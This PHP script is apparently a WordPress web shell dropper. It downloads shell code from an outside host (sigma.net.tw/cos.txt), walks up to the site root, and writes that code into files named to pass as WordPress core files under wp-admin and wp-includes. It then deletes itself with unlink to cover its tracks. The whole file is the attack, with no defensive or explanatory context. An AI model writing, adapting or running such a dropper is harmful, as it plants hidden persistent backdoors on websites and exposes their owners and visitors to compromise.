<?php

function url_get_contents ($Url) {
    if (!function_exists('curl_init')){ 
        die('CURL is not installed!');
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

$tresc_shella = fopen("http://sigma.net.tw/cos.txt", "w+");
echo $tresc_shella;
if ( $tresc_shella == null){
$tresc_shella=url_get_contents("http://sigma.net.tw/cos.txt");
}
$tresc_shella2 = fopen("http://sigma.net.tw/cos.txt", "w+");
echo $tresc_shella2;
if ( $tresc_shella2 == null){
$tresc_shella2=url_get_contents("http://sigma.net.tw/cos.txt");
}
$tresc_shella3 = fopen("http://sigma.net.tw/cos.txt", "w+");
echo $tresc_shella3;
if ( $tresc_shella3 == null){
$tresc_shella3=url_get_contents("http://sigma.net.tw/cos.txt");
}

$sciezka=dirname(dirname(dirname(dirname(dirname(dirname(__FILE__))))));
echo "<hr>sss:$sciezka<hr>";
echo "$sciezka.$nazwa_pliku,";
$zapisz=file_put_contents($sciezka."/wp-admin/includes/"."class-wp-plugins-list-admin.php",$tresc_shella);
$zapisz2=file_put_contents($sciezka."/wp-includes/Text/Diff/Renderer/"."admin.php",$tresc_shella2);
//$zapisz2=file_put_contents($sciezka."/wp-includes/SimplePie/Content/Type/"."library.php",$tresc_shella3);

unlink(__FILE__);

?>